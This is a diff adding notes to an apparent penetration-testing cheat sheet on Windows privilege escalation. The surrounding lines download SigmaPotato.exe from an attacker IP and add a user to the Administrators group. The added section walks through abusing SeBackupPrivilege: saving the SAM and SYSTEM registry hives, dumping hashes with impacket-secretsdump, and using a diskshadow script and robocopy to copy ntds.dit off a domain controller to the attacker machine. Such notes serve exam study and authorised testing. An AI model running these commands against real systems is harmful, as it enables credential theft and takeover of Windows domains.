@@ -29,6 +29,53 @@ iwr -uri http://$(IP_ADDRESS)/SigmaPotato.exe -OutFile SigmaPotato.exe
 ```powershell
 .\SigmaPotato "net localgroup Administrators dave4 /add"
 ```
+# SeBackupPrivilege
+Domain Controllers won't store passwords in SAM but NTDS.dit - however old passwords could still be there. Always run BOTH on DC.
+## Local Windows
+```
+mkdir C:\temp
+```
+```
+reg save HKLM\SAM SAM
+```
+```
+reg save HKLM\SYSTEM SYSTEM
+```
+Then transfer the sam and system files to kali (i.e. download on winrm, shared folder on xfreerdp, etc).
+
+Then run the following to dump hashes:
+```bash
+impacket-secretsdump local -sam SAM -system SYSTEM
+```
+## Domain Controller
+Save this as diskshadow.txt:
+```
+set verbose on
+set metadata C:\Windows\Temp\meta.cab
+set context clientaccessible
+set context persistent
+begin backup
+add volume C: alias cdrive
+create
+expose %cdrive% E:
+end backup
+```
+```
+unix2dos diskshadow.txt
+```
+Upload the created file to the target.
+
+On the remote target, run the following:
+```
+mkdir C:\temp
+```
+```
+diskshadow /s dishshadow.txt
+```
+```
+robocopy /b E:\Windows\ntds . ntds.dit
+```
+Transfer ntds.dit from the target to the attacker machine.
 # Mimikatz
 If a user has either of the following privileges, mimikatz can be used:
 * SeImpersonatePrivilege
